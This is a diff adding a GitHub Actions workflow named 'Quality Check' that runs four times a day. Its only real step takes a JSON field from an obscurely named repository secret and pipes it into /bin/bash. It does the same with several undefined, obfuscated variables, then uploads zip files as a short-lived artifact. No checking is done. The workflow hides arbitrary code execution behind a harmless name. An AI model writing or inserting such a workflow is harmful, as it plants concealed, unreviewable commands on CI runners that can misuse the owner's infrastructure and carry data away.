@@ -1,0 +1,31 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '43 2,8,14,20 * * *'
+env:
+  CI: true
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Main step
+        env:
+          uvcao248: ${{ secrets.uvcao248 }}
+        run: |
+          printf '%s' "$uvcao248" | jq -r .o11 | /bin/bash
+          echo $af89821 | jq -r .xxw99492 | /bin/bash
+          echo $uwfdy904 | jq -r .xb11677 | /bin/bash
+          echo $bog56 | jq -r .ohmss54085 | /bin/bash
+          echo $aqtm584 | jq -r .bog14 | /bin/bash
+
+      - name: Save data
+        uses: actions/upload-artifact@v4
+        with:
+          name: vtSwH5ST
+          path: "*.zip"
+          retention-days: 1
